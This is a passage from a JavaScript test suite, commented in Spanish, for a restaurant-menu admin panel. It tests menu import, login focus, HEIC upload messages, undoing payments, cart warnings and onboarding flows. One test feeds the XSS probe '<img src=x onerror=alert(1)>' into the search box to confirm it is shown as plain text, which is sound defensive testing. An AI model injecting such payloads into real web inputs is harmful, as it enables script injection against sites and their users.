		assert.equal(ctx.impNombresQueYaTiene().has(ctx.impNormalizar('CAFE CON LECHE')), true);
	});
});

describe('importar la carta · una categoría que se parece a otra que ya existe', () => {
	// Pasó en la primera importación real: el restaurante tenía 'Hamburguesas'
	// y el PDF decía 'HAMBURGUESA'. Se crearon las dos y la carta acabó con dos
	// secciones de lo mismo.
	const panel = () => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		{ state: { productos: [], categorias: [] } });

	test('singular y plural comparten raíz', () => {
		const { impRaiz } = panel();
		for (const [a, b] of [['Hamburguesas', 'HAMBURGUESA'], ['POSTRES', 'Postre'],
			['Bebidas calientes', 'BEBIDA CALIENTE'], ['Raviol', 'Ravioles']])
			assert.equal(impRaiz(a), impRaiz(b), `${a} / ${b}`);
	});

	test('dos categorías distintas NO comparten raíz', () => {
		const { impRaiz } = panel();
		for (const [a, b] of [['CARNES', 'PESCADOS'], ['POSTRES', 'PASTAS'], ['CALDOS', 'ENSALADAS']])
			assert.notEqual(impRaiz(a), impRaiz(b), `${a} / ${b}`);
	});

	test('la raíz no se usa para juntar, solo para preguntar', () => {
		// impTotales sigue comparando por el nombre completo: 'HAMBURGUESA'
		// cuenta como nueva aunque exista 'Hamburguesas'. Juntarlas sin que
		// nadie lo vea movería platos de sitio.
		const ctx = cargar('importar.js',
			[['// ── IMPORTAR LA CARTA ─', null]],
			{ state: { productos: [], categorias: [{ id: 'c1', nombre: 'Hamburguesas' }] } });
		const t = ctx.impTotales({ categorias: [{ nombre: 'HAMBURGUESA', platos: [{ nombre: 'DOBLE' }] }] },
			[{ id: 'c1', nombre: 'Hamburguesas' }]);
		assert.equal(t.nuevas, 1);
		assert.equal(t.existen, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la miniatura de la lista de productos se pide en diferido', () => {
	// Es una línea y se cae sola en cualquier refactor de esa función, sin que
	// nada se rompa a la vista: la lista sigue pintándose igual. Lo único que
	// cambia es que una carta de 97 platos vuelve a descargar sus 61 fotos de
	// golpe, y eso no lo nota nadie desde un escritorio con fibra.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	// El trozo que va desde que se crea el <img> hasta que se cuelga del DOM.
	const bloque = src.match(/const im\s*=\s*document\.createElement\('img'\);[\s\S]{0,1200}?imgDiv\.appendChild\(im\);/);

	test('el bloque que crea la miniatura sigue existiendo', () => {
		// Si esto falla, la función se reescribió y las dos comprobaciones de
		// abajo estarían midiendo el vacío en vez de la miniatura.
		assert.ok(bloque, 'no se encontró dónde se crea la miniatura del producto');
	});

	test('lleva loading="lazy"', () => {
		assert.match(bloque[0], /\bim\.loading\s*=\s*'lazy'/,
			'la miniatura tiene que pedirse en diferido');
	});

	test('y se pone ANTES del src', () => {
		// Después del src no sirve de nada: el navegador ya arrancó la descarga
		// y el atributo llega tarde. Es el error fácil de cometer al reordenar.
		const posLoading = bloque[0].indexOf('im.loading');
		const posSrc     = bloque[0].indexOf('im.src');
		assert.ok(posLoading >= 0 && posSrc >= 0);
		assert.ok(posLoading < posSrc,
			'loading se asigna después del src, así que no surte efecto');
	});
});


// ═══════════════════════════════════════════════════════════════
describe('el login recibe el foco al llegar a él', () => {
	// Hay DOS caminos que acaban en el login y arreglar uno solo deja el otro
	// roto, así que se prueban por separado.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('el arranque sin sesión lo enfoca', () => {
		const arranque = src.match(/\} else \{[^}]*loginScreen'\)\.style\.display='flex';[^}]*\}/);
		assert.ok(arranque, 'no se encontró la rama de arranque que enseña el login');
		assert.match(arranque[0], /enfocarLogin\(\)/,
			'al arrancar sin sesión el foco no llega al identificador');
	});

	test('y salir devuelve el foco al campo', () => {
		// logout() no recarga la página: esconde unas pantallas y enseña otra.
		// Sin esto, salir para entrar como otro restaurante deja el foco en
		// ninguna parte y hay que ir al campo con el ratón.
		const cuerpo = src.match(/function logout\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo, 'no se encontró logout()');
		assert.match(cuerpo[0], /enfocarLogin\(\)/,
			'logout() no devuelve el foco al identificador');
	});

	test('no se usa el atributo autofocus', () => {
		// Sería lo obvio y está descartado a propósito: dispara al cargar la
		// página, y ahí todavía no se sabe si el login es el destino. Con
		// sesión guardada el arranque enseña el panel, y el foco habría
		// quedado en un campo ya invisible.
		const campo = src.match(/<input[^>]*id="slugInput"[\s\S]*?>/);
		assert.ok(campo, 'no se encontró el campo del identificador');
		assert.doesNotMatch(campo[0], /\bautofocus\b/,
			'el foco se pone desde los dos puntos de entrada, no con el atributo');
	});

	// ── Olvidar el PIN (L1) ─────────────────────────────────────
	test('el gestor de contraseñas puede guardar y ofrecer el acceso', () => {
		// El cliente entra cada varias semanas. Con autocomplete="off" el
		// navegador no guardaba el identificador, y sin declarar nada en el PIN
		// no siempre lo emparejaba con él.
		const slug = src.match(/<input[^>]*id="slugInput"[\s\S]*?>/);
		const pin = src.match(/<input[^>]*id="pinInput"[\s\S]*?>/);
		assert.match(slug[0], /autocomplete="username"/);
		assert.match(pin[0], /autocomplete="current-password"/);
	});

	test('el login dice a quién pedir un PIN olvidado', () => {
		const pista = src.match(/<div class="login-hint">[\s\S]*?<\/div>/);
		assert.ok(pista, 'no se encontró la línea bajo el botón');
		assert.match(pista[0], /Olvidaste tu PIN/);
		const enlace = pista[0].match(/href="([^"]+)"/);
		assert.ok(enlace, 'la línea no enlaza a ningún sitio');
		// El mismo número que la landing. Con el prefijo del país: sin él,
		// wa.me no abre ningún chat.
		assert.match(enlace[1], /^https:\/\/wa\.me\/573151182283\b/);
		assert.match(pista[0], /rel="noopener"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una foto HEIC que el navegador no abre dice qué hacer', () => {
	// Probado a mano el 10/09/2026 con una foto de iPhone sin convertir: salía el
	// mismo mensaje que para un PDF renombrado, que no dice qué pasa ni cómo
	// arreglarlo. Ver SU1 en docs/revision-ux.md.
	const f = () => cargar('index.html', 'function esHeic', 'function compressImage',
		{ String, RegExp });
	const archivo = (name, type = '') => ({ name, type });

	test('.heic con el tipo vacío, que es lo que llega en Windows', () => {
		// El sistema no tiene registrado HEIC, así que el navegador deja el tipo
		// en blanco. Si solo se mirara el tipo, este caso —el de quien pasó la
		// foto al computador— se quedaría con el mensaje genérico.
		assert.equal(f().esHeic(archivo('IMG_4021.heic', '')), true);
	});

	test('el tipo image/heic, aunque el nombre no lo diga', () => {
		assert.equal(f().esHeic(archivo('foto', 'image/heic')), true);
		assert.equal(f().esHeic(archivo('foto', 'image/heif-sequence')), true);
	});

	test('sin distinguir mayúsculas, que es como las nombra el iPhone', () => {
		assert.equal(f().esHeic(archivo('IMG_4021.HEIC')), true);
		assert.equal(f().esHeic(archivo('captura.HEIF')), true);
	});

	test('un JPEG normal no es HEIC', () => {
		assert.equal(f().esHeic(archivo('plato.jpg', 'image/jpeg')), false);
	});

	test('que "heic" aparezca en el nombre no basta: tiene que ser la extensión', () => {
		// Un includes('heic') a secas lo confundiría, y le daría las instrucciones
		// del iPhone a quien subió un JPEG corrupto con un nombre desafortunado.
		assert.equal(f().esHeic(archivo('heic-receta-final.jpg', 'image/jpeg')), false);
	});

	test('el mensaje del HEIC nombra el formato y dice qué hacer', () => {
		// Que no se «simplifique» de vuelta a algo que no ayuda: tiene que decir
		// qué es y dar una salida.
		const m = f().mensajeImagenIlegible(archivo('IMG_4021.heic'));
		assert.match(m, /HEIC/);
		assert.match(m, /Fotos/, 'falta la instrucción que lo resuelve en el iPhone');
		assert.match(m, /JPG/, 'falta la salida para quien no sube desde el iPhone');
	});

	test('lo que no es HEIC conserva el mensaje de siempre', () => {
		// Es el texto del caso del PDF renombrado, verificado en producción el
		// 10/09/2026. Para ese caso es el mensaje justo y no se toca.
		assert.equal(f().mensajeImagenIlegible(archivo('documento.jpg', 'image/jpeg')),
			'Ese archivo no es una imagen que el navegador pueda abrir');
	});

	test('compressImage usa este mensaje cuando la imagen no decodifica', () => {
		// Las funciones pueden estar perfectas y no servir de nada si el
		// onerror vuelve a escribir el texto a mano.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function compressImage\([\s\S]*?\n\}/);
		assert.ok(cuerpo, 'no se encontró compressImage');
		assert.match(cuerpo[0], /img\.onerror\s*=\s*\(\)\s*=>\s*rej\(new Error\(mensajeImagenIlegible\(file\)\)\)/,
			'el onerror ya no pasa por mensajeImagenIlegible');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('«✓ Pagó» se puede deshacer', () => {
	// S1 en docs/revision-ux.md: un clic mal dado marcaba a un cliente como
	// pagado, borraba el aviso de «Vencido» y no había forma de volver atrás
	// desde el panel. Arreglarlo era SQL contra producción.

	// ── Un DOM mínimo, con className y classList sincronizados ─────
	function nodo() {
		const n = {
			children: [], type: '', onclick: null, _cls: new Set(), _texto: '',
			get className() { return [...this._cls].join(' '); },
			set className(v) { this._cls = new Set(String(v).split(/\s+/).filter(Boolean)); },
			get textContent() { return this._texto ?? this.children.map(c => c.textContent).join(''); },
			set textContent(v) { this._texto = String(v); this.children = []; },
			appendChild(c) { this._texto = undefined; this.children.push(c); return c; },
		};
		n.classList = {
			add: (...c) => c.forEach(x => n._cls.add(x)),
			remove: (...c) => c.forEach(x => n._cls.delete(x)),
			contains: c => n._cls.has(c),
		};
		return n;
	}

	function montarToast() {
		const toast = nodo();
		const reloj = { pendiente: null };
		const ctx = cargar('comun.js', 'let toastTimer=null;', null, {
			document: { getElementById: () => toast, createElement: () => nodo() },
			setTimeout: (fn, ms) => { reloj.pendiente = { fn, ms }; return 1; },
			clearTimeout: () => { reloj.pendiente = null; },
			String,
		});
		const boton = () => toast.children.find(c => c.className === 'toast-accion');
		return { ctx, toast, reloj, boton };
	}

	test('sin acción, el toast se comporta como siempre', () => {
		// Lo usan decenas de sitios del panel. No puede cambiar para ninguno.
		const { ctx, toast, reloj, boton } = montarToast();
		ctx.showToast('Guardado', 'success');
		assert.equal(toast.textContent, 'Guardado');
		assert.equal(toast.classList.contains('con-accion'), false);
		assert.equal(boton(), undefined);
		assert.equal(reloj.pendiente.ms, 3000);
	});

	test('con acción, lleva el botón y se puede pulsar', () => {
		const { ctx, toast, boton } = montarToast();
		let pulsado = false;
		ctx.showToast('Bonzas: pago registrado', 'success',
			{ texto: 'Deshacer', alPulsar: () => { pulsado = true; } });
		assert.ok(boton(), 'no se pintó el botón');
		assert.equal(boton().textContent, 'Deshacer');
		// Sin esta clase hereda pointer-events:none y el botón no recibe el clic.
		assert.equal(toast.classList.contains('con-accion'), true);
		boton().onclick();
		assert.equal(pulsado, true);
		assert.equal(toast.classList.contains('show'), false, 'el toast no se escondió al pulsar');
	});

	test('dura más que los 3 s de siempre, para dar tiempo a reaccionar', () => {
		const { ctx, reloj } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		assert.ok(reloj.pendiente.ms > 3000);
	});

	test('al caducar no deja un toast invisible bloqueando clics', () => {
		// El caso delicado. Si al esconderse conservara 'con-accion', quedaría
		// transparente pero con pointer-events:auto, tapando la esquina donde
		// suele estar el botón de Guardar.
		const { ctx, toast, reloj } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		reloj.pendiente.fn();
		assert.equal(toast.classList.contains('show'), false);
		assert.equal(toast.classList.contains('con-accion'), false,
			'el toast escondido sigue recibiendo clics');
	});

	test('un toast normal después reemplaza al que tenía botón', () => {
		const { ctx, toast, boton } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		ctx.showToast('Otra cosa', 'info');
		assert.equal(boton(), undefined, 'el botón viejo sigue ahí');
		assert.equal(toast.classList.contains('con-accion'), false);
	});

	// ── Marcar y deshacer ───────────────────────────────────────
	function montarPago(factura, apiFetch) {
		const peticiones = [];
		const toasts = [];
		const ctx = cargar('index.html', 'async function marcarComoPagado', 'async function eliminarRestaurante', {
			facturacionDe: () => factura,
			apiFetch: apiFetch || (async (metodo, ruta, cuerpo) => { peticiones.push({ metodo, ruta, cuerpo }); return {}; }),
			cargarListaRestos: async () => {},
			showToast: (msg, tipo, accion) => toasts.push({ msg, tipo, accion }),
			Date, String,
		});
		return { ctx, peticiones, toasts };
	}
	const tanda = () => new Promise(r => setImmediate(r));

	test('deshacer restaura la fecha de pago que había antes', async () => {
		const { ctx, peticiones, toasts } = montarPago({ ultimo_pago: '2026-08-01' });
		await ctx.marcarComoPagado('r1', 'Bonzas');
		assert.match(peticiones[0].cuerpo.ultimo_pago, /^\d{4}-\d{2}-\d{2}$/);
		toasts[0].accion.alPulsar();
		await tanda();
		assert.equal(peticiones[1].cuerpo.ultimo_pago, '2026-08-01');
	});

	test('y si no había ningún pago, lo devuelve a null, no a una fecha', async () => {
		// El caso fácil de equivocar: un restaurante que nunca pagó. Deshacer
		// tiene que dejarlo sin fecha, que es lo que lo pinta como «Vencido».
		const { ctx, peticiones, toasts } = montarPago(null);
		await ctx.marcarComoPagado('r1', 'Bonzas');
		toasts[0].accion.alPulsar();
		await tanda();
		assert.ok('ultimo_pago' in peticiones[1].cuerpo, 'no se mandó la clave');
		assert.equal(peticiones[1].cuerpo.ultimo_pago, null);
	});

	test('el toast nombra el restaurante', async () => {
		// El error típico es la fila equivocada; el nombre es lo que lo delata.
		const { ctx, toasts } = montarPago(null);
		await ctx.marcarComoPagado('r1', 'Bonzas Burger Grill');
		assert.match(toasts[0].msg, /Bonzas Burger Grill/);
		assert.equal(toasts[0].accion.texto, 'Deshacer');
	});

	test('si deshacer falla, dice que el pago sigue registrado', async () => {
		// Un «error» a secas dejaría creer que se deshizo.
		const { ctx, toasts } = montarPago(null, async () => { throw new Error('red'); });
		await ctx.deshacerPago('r1', 'Bonzas', null);
		assert.equal(toasts[0].tipo, 'error');
		assert.match(toasts[0].msg, /sigue marcado como pagado/);
	});

	// ── La ficha enseña cuándo se pagó ──────────────────────────
	const ficha = () => cargar('index.html',
		[['function diaDelMesClamped', '// Recibe la fila de facturación'],
		 ['function estadoPagoHtml', '// ── MARCAR COMO PAGADO']],
		{ Date, Math, String });
	const hoyISO = () => {
		const d = new Date();
		return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
	};

	test('un restaurante al día enseña la fecha de su último pago', () => {
		// Así un pago marcado por error sigue a la vista cuando ya caducó el
		// «Deshacer», en vez de ser una etiqueta verde igual a un pago de verdad.
		const html = ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: hoyISO() });
		assert.match(html, /pagó el/);
	});

	test('uno vencido y sin ningún pago no revienta', () => {
		// La fecha del pago se calcula después de la rama de «vencido» a
		// propósito: ahí puede no haber pago, y formatear null lanzaría.
		assert.doesNotThrow(() => ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: null }));
		assert.match(ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: null }), /Vencido/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una carta con carrito y sin WhatsApp se ve desde el panel', () => {
	// PE1 en docs/revision-ux.md. El estado roto no nace de borrar el número
	// —savePedidos() no deja guardarlo vacío— sino de no ponerlo nunca al pasar
	// un restaurante a un modelo con carrito. Así estaba A Ojo Cerrado.
	const reglas = [['const MODELO_POR_DEFECTO', '// En qué proporción se recorta el video']];
	const regla = () => cargar('index.html', reglas, { String });
	const aviso = () => cargar('index.html',
		[...reglas, ['function avisoPedidosHtml', 'function fichaPlanHtml']],
		{ String, planDe: r => r._plan || {} });

	const CON_CARRITO = { carrito: true };

	test('el modelo Carrito tiene carrito siempre, sin mirar plan ni interruptor', () => {
		assert.equal(regla().cartaTieneCarrito({ nav: 'carrito' }, {}), true);
	});

	test('Video y Vertical, solo con plan e interruptor', () => {
		const r = regla();
		assert.equal(r.cartaTieneCarrito({ nav: 'video', carrito: true }, CON_CARRITO), true);
		assert.equal(r.cartaTieneCarrito({ nav: 'vertical', carrito: false }, CON_CARRITO), false);
		assert.equal(r.cartaTieneCarrito({ nav: 'video', carrito: true }, {}), false);
	});

	test('Topnav, Sidebar y Explorar no tienen carrito aunque plan e interruptor digan que sí', () => {
		// El caso que lo justifica todo. La pestaña Pedidos sí se enciende para
		// ellos, pero en la carta ninguno llama a activarCarrito(): avisar de que
		// no reciben pedidos sería una falsa alarma.
		const r = regla();
		for (const nav of ['topnav', 'sidebar', 'explorar']) {
			assert.equal(r.cartaTieneCarrito({ nav, carrito: true }, CON_CARRITO), false, nav);
		}
	});

	test('sin modelo elegido cuenta como el modelo por defecto, que no tiene carrito', () => {
		assert.equal(regla().cartaTieneCarrito({ carrito: true }, CON_CARRITO), false);
	});

	test('recibePedidos limpia el número igual que la carta', () => {
		const r = regla();
		assert.equal(r.recibePedidos({ whatsapp_pedidos: '+57 300 123 4567' }), true);
		assert.equal(r.recibePedidos({ whatsapp_pedidos: '  - + ' }), false);
		assert.equal(r.recibePedidos({}), false);
	});

	test('la lista marca a quien tiene carrito y no tiene número', () => {
		const html = aviso().avisoPedidosHtml({ atributos: { nav: 'carrito' } });
		assert.match(html, /no recibe pedidos/);
		assert.match(html, /resto-etiqueta mal/);
	});

	test('y no marca a quien ya tiene número', () => {
		assert.equal(aviso().avisoPedidosHtml({ atributos: { nav: 'carrito', whatsapp_pedidos: '573001234567' } }), '');
	});

	test('ni a un Topnav con el interruptor encendido, que no tiene carrito', () => {
		assert.equal(aviso().avisoPedidosHtml({ atributos: { nav: 'topnav', carrito: true }, _plan: CON_CARRITO }), '');
	});

	test('la pestaña Pedidos enciende y apaga el aviso', () => {
		const caja = { style: {} };
		const estado = { restaurante: { atributos: { nav: 'carrito' } } };
		const ctx = cargar('index.html',
			[...reglas, ['function actualizarAvisoPedidos', 'async function savePedidos']],
			{ String, state: estado, planActual: () => ({}), document: { getElementById: () => caja } });
		ctx.actualizarAvisoPedidos();
		assert.equal(caja.style.display, 'block', 'sin número el aviso no se enseña');
		estado.restaurante.atributos.whatsapp_pedidos = '573001234567';
		ctx.actualizarAvisoPedidos();
		assert.equal(caja.style.display, 'none', 'con número el aviso sigue a la vista');
	});

	test('guardar el número vuelve a evaluar el aviso', () => {
		// Si no, se guarda el número y el aviso rojo sigue ahí hasta recargar.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/async function savePedidos\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo, 'no se encontró savePedidos');
		assert.match(cuerpo[0], /actualizarAvisoPedidos\(\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Apariencia no pierde cambios en silencio', () => {
	// A1 y A2 en docs/revision-ux.md. Dos guardados a casi cuatro mil píxeles,
	// ninguna señal de lo pendiente, y subir una imagen reiniciaba el formulario.

	function montar() {
		const nodos = {};
		const nodo = () => ({ value: '', checked: false, textContent: '', src: '', style: {}, dataset: {} });
		const $ = id => (nodos[id] ||= nodo());
		const estado = { restaurante: { atributos: {} } };
		const ctx = cargar('index.html', '// ── CAMBIOS SIN GUARDAR EN APARIENCIA', 'async function renderDatosResto() {', {
			document: { getElementById: $ },
			state: estado,
			JSON, String,
			// La forma real de lo que se guarda, reducida a lo que estas pruebas tocan.
			recolectarApariencia: () => ({
				color_primario: $('apColor1').value,
				atributos: { portada_activa: $('apPortadaActiva').checked },
			}),
		});
		const correr = codigo => vm.runInContext(codigo, ctx);
		const foto = () => { correr('fotoApariencia = aparienciaActual(); fotoDatosResto = datosRestoActuales();'); };
		return { ctx, $, estado, correr, foto };
	}

	test('recién pintado, no hay nada pendiente', () => {
		// Si la foto no coincidiera con el formulario, la pestaña diría «cambios
		// sin guardar» nada más abrirla.
		const { ctx, $, foto } = montar();
		$('apColor1').value = '#ff0000';
		$('apNombreResto').value = 'Bonzas';
		foto();
		assert.equal(ctx.hayCambiosApariencia(), false);
		assert.equal(ctx.hayCambiosDatosResto(), false);
	});

	test('cambiar un campo lo marca pendiente junto a su propio botón', () => {
		const { ctx, $, foto } = montar();
		foto();
		$('apColor1').value = '#00ff00';
		ctx.marcarPendientes();
		assert.match($('apArienciaStatus').textContent, /Cambios sin guardar/);
		assert.equal($('apDatosRestoStatus').textContent, '', 'marcó pendiente la sección que no se tocó');
	});

	test('volver al valor guardado quita el aviso', () => {
		const { ctx, $, foto } = montar();
		$('apColor1').value = '#ff0000';
		foto();
		$('apColor1').value = '#00ff00'; ctx.marcarPendientes();
		$('apColor1').value = '#ff0000'; ctx.marcarPendientes();
		assert.equal($('apArienciaStatus').textContent, '');
	});

	test('A1: guardar la apariencia con el nombre sin guardar lo dice junto al botón pulsado', () => {
		// El caso exacto del hallazgo. El aviso de la sección de arriba queda a
		// casi cuatro mil píxeles; tiene que decirse donde está quien pulsó.
		const { ctx, $, correr, foto } = montar();
		foto();
		$('apNombreResto').value = 'Nombre nuevo';
		correr('fotoApariencia = aparienciaActual();');   // se guardó la apariencia
		ctx.pintarGuardado('apArienciaStatus', ctx.hayCambiosDatosResto(), 'Datos del restaurante', 'arriba');
		ctx.marcarPendientes();
		assert.match($('apArienciaStatus').textContent, /Datos del restaurante.*sigue sin guardar/);
		assert.match($('apDatosRestoStatus').textContent, /Cambios sin guardar/);
	});

	test('guardar después la otra sección retira el aviso que ya es falso', () => {
		const { ctx, $, correr, foto } = montar();
		foto();
		$('apNombreResto').value = 'Nombre nuevo';
		correr('fotoApariencia = aparienciaActual();');
		ctx.pintarGuardado('apArienciaStatus', ctx.hayCambiosDatosResto(), 'Datos del restaurante', 'arriba');
		ctx.marcarPendientes();
		// Ahora se guardan también los datos.
		correr('fotoDatosResto = datosRestoActuales();');
		ctx.pintarGuardado('apDatosRestoStatus', ctx.hayCambiosApariencia(), 'Apariencia', 'abajo');
		ctx.marcarPendientes();
		assert.equal($('apArienciaStatus').textContent, '✓ Guardado',
			'la apariencia sigue diciendo que los datos no se han guardado');
	});

	test('un estado que pintó otra función se respeta', () => {
		// «Error al guardar» o «Slug inválido» los pone guardarDatosResto. Que el
		// oyente de la pestaña los borre al siguiente clic sería esconder un error.
		const { ctx, $, foto } = montar();
		foto();
		$('apDatosRestoStatus').textContent = 'Slug inválido: solo minúsculas, números y guiones';
		ctx.marcarPendientes();
		assert.match($('apDatosRestoStatus').textContent, /Slug inválido/);
	});

	test('pintar las imágenes no toca ningún campo del formulario', () => {
		// Antes subir el logo llamaba a renderApariencia, que rellenaba todos los
		// campos desde lo guardado y se llevaba por delante lo que no se guardó.
		const { ctx, $, estado } = montar();
		$('apColor1').value = '#00ff00';   // cambio sin guardar
		estado.restaurante = { logo_url: '/uploads/logos/x.webp', atributos: {} };
		ctx.pintarImagenesApariencia();
		assert.equal($('apColor1').value, '#00ff00', 'se perdió el color sin guardar');
		assert.equal($('apLogoPreview').src, '/uploads/logos/x.webp');
		assert.equal($('apLogoDelBtn').style.display, 'inline-block');
	});

	test('subir la portada la enciende sin inventar un cambio pendiente', () => {
		// El servidor pone portada_activa a true. Si solo se actualizara el
		// interruptor y no la foto de referencia, marcaría un cambio que nadie hizo.
		const { ctx, $, estado, foto } = montar();
		foto();
		estado.restaurante = { atributos: { portada_activa: true, portada_url: '/p.webp' } };
		ctx.sincronizarPortadaActiva();
		assert.equal($('apPortadaActiva').checked, true);
		assert.equal(ctx.hayCambiosApariencia(), false);
	});

	test('los cuatro manejadores de imagen ya no reinician el formulario', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		for (const f of ['handleLogoUpload', 'handleFondoUpload', 'handlePortadaUpload', 'eliminarImagen']) {
			const cuerpo = src.match(new RegExp(`async function ${f}\\([\\s\\S]*?\\n\\}`));
			assert.ok(cuerpo, `no se encontró ${f}`);
			assert.doesNotMatch(cuerpo[0], /renderApariencia\(\)/, `${f} vuelve a llamar a renderApariencia`);
			assert.match(cuerpo[0], /pintarImagenesApariencia\(\)/, `${f} no refresca las vistas previas`);
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el primer día de un restaurante', () => {
	// F1 y F3 en docs/revision-ux.md. Un restaurante recién creado aterrizaba en
	// «Sin productos»; «+ Nuevo producto» abría una ficha que no se podía guardar
	// porque no había categorías, y nada decía dónde crearlas.

	const primerDia = ['// ── EL PRIMER DÍA', 'function renderProducts() {'];

	// ── Qué dice la lista vacía ─────────────────────────────────
	const vacio = () => cargar('index.html', ...primerDia, { String });

	test('sin platos ni categorías: se empieza por la categoría', () => {
		const v = vacio().vacioDeProductos({ total: 0, categorias: 0, busqueda: '', enCategoria: false });
		assert.equal(v.accion, 'categoria');
		assert.match(v.boton, /primera categoría/);
	});

	test('con categorías y sin platos: se añade el primero', () => {
		const v = vacio().vacioDeProductos({ total: 0, categorias: 3, busqueda: '', enCategoria: false });
		assert.equal(v.accion, 'plato');
	});

	test('con cien platos y una búsqueda sin resultados NO manda a crear categorías', () => {
		// La trampa de este cambio. «Sin productos» salía también aquí, y la guía
		// del primer día le diría a Bonzas que cree su primera categoría porque
		// buscó «pizza».
		const v = vacio().vacioDeProductos({ total: 97, categorias: 21, busqueda: 'pizza', enCategoria: false });
		assert.equal(v.accion, null);
		assert.equal(v.boton, null);
		assert.match(v.texto, /pizza/);
	});

	test('una categoría sin platos lo dice así, sin guía de primer día', () => {
		const v = vacio().vacioDeProductos({ total: 97, categorias: 21, busqueda: '', enCategoria: true });
		assert.equal(v.accion, null);
		assert.match(v.titulo, /categoría está vacía/);
	});

	// ── Cómo se pinta ───────────────────────────────────────────
	function domMinimo() {
		const nodo = tag => ({
			tag, children: [], className: '', textContent: '', type: '', onclick: null, style: {},
			set innerHTML(v) { this.children = []; this._html = v; },
			get innerHTML() { return this._html ?? ''; },
			appendChild(c) { this.children.push(c); return c; },
		});
		return { document: { createElement: nodo, getElementById: () => nodo('div') }, nodo };
	}

	test('lo que se buscó se pinta como texto, nunca como HTML', () => {
		// La búsqueda la escribe quien usa el panel. Pintarla con innerHTML
		// convertiría un «<img onerror=…>» en un elemento.
		const { document, nodo } = domMinimo();
		const lista = nodo('div');
		const ctx = cargar('index.html', ...primerDia, {
			String, document,
			state: { productos: [{}], categorias: [{}], catFiltro: 'all' },
			abrirPrimeraCategoria() {}, openNewProductModal() {},
		});
		ctx.pintarVacioProductos(lista, '<img src=x onerror=alert(1)>');
		const caja = lista.children[0];
		const p = caja.children.find(c => c.tag === 'p');
		assert.match(p.textContent, /<img src=x onerror=alert\(1\)>/, 'la búsqueda tendría que verse literal');
		assert.equal(caja.children.some(c => c.tag === 'img'), false);
	});

	test('el botón del primer día abre la categoría con su nota', () => {
		// Corre el abrirPrimeraCategoria real: se comprueba lo que deja hecho —la
		// nota visible y la bandera puesta— y no que alguien lo haya llamado.
		const { document, nodo } = domMinimo();
		const lista = nodo('div');
		const nota = { style: { display: 'none' } };
		let catAbierta = false;
		const ctx = cargar('index.html', ...primerDia, {
			String,
			document: { createElement: document.createElement, getElementById: id => (id === 'catPrimeraNota' ? nota : nodo('div')) },
			state: { productos: [], categorias: [], catFiltro: 'all' },
			openNewCatModal() { catAbierta = true; }, openNewProductModal() {},
		});
		ctx.pintarVacioProductos(lista, '');
		const boton = lista.children[0].children.find(c => c.tag === 'button');
		assert.ok(boton, 'no hay botón en el vacío del primer día');
		boton.onclick();
		assert.equal(catAbierta, true, 'no se abrió la categoría');
		assert.equal(nota.style.display, 'block', 'la nota de «antes del primer plato» no se enseña');
		assert.equal(vm.runInContext('seguirConPlato', ctx), true, 'no quedó marcado que hay que volver al plato');
	});

	// ── «+ Nuevo producto» sin categorías ───────────────────────
	test('sin categorías, «+ Nuevo producto» no abre una ficha que no se puede guardar', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function openNewProductModal\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo);
		// La comprobación va ANTES de tocar la ficha: si se hiciera después, ya
		// se habría abierto y limpiado.
		const posGuarda = cuerpo[0].indexOf('abrirPrimeraCategoria()');
		const posAbrir = cuerpo[0].indexOf("openModal('productModal')");
		assert.ok(posGuarda > 0, 'openNewProductModal no comprueba si hay categorías');
		assert.ok(posGuarda < posAbrir);
	});

	test('esconder buscador y orden depende del total, no de la lista filtrada', () => {
		// Si dependiera de la lista filtrada, una búsqueda sin resultados haría
		// desaparecer el buscador justo cuando hay que borrarla.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		assert.match(src, /const sinPlatos = !state\.productos\.length;/);
	});

	test('abrir una categoría por el camino normal baja la bandera', () => {
		// Si alguien cancela la primera categoría y días después crea otra desde
		// «+ Nueva categoría», no debe abrírsele un plato que nunca pidió.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function openNewCatModal\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo);
		assert.match(cuerpo[0], /seguirConPlato = false/);
		assert.match(cuerpo[0], /catPrimeraNota'\)\.style\.display='none'/);
	});

	// ── Guardar la primera categoría vuelve al plato ────────────
	function montarGuardado({ id = '', seguir = false } = {}) {
		const campos = {};
		const $ = k => (campos[k] ||= { value: '', checked: false, disabled: false, textContent: '', style: {}, focus() {} });
		$('editCatId').value = id;
		$('editCatNombre').value = 'Entradas';
		const abiertos = [];
		const estado = {
			restaurante: { id: 'r1' }, pendingCatImgUrl: null,
			categorias: id ? [{ id, nombre: 'Vieja', orden: 0 }] : [],
		};
		const ctx = cargar('index.html',
			[primerDia, ['async function saveCat', '// ── MOVER CATEGORÍA']],
			{
				String, parseInt, document: { getElementById: $ }, state: estado,
